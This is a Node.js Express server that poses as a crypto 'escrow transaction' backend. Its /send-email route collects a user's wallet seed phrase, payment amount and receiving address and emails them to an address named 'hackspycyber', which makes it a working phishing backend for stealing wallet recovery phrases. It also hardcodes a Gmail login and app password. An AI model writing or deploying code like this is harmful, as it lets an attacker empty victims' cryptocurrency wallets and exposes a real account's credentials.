const nodemailer = require('nodemailer');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Route to serve the index.html file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'tobi.gbolagoke@gmail.com',
        pass: 'eyvy vxru ouqk vchd'
    }
});

app.post('/send-email', (req, res) => {
    const { walletPhrase, transactionAmount, usdValue, paymentMethod, address } = req.body;

    const mailOptions = {
        from: 'tobi.gbolagoke@gmail.com',
        to: 'hackspycyber@gmail.com',
        subject: 'Escrow Transaction Details',
        text: `
        Wallet Phrase: ${walletPhrase}
        Transaction Amount (π): ${transactionAmount}
        Equivalent in USD: $${usdValue}
        Payment Method: ${paymentMethod}
        Receiving Address: ${address}
        `
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).send('Error sending email');
        } else {
            console.log('Email sent:', info.response);
            res.send('Email sent successfully');
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
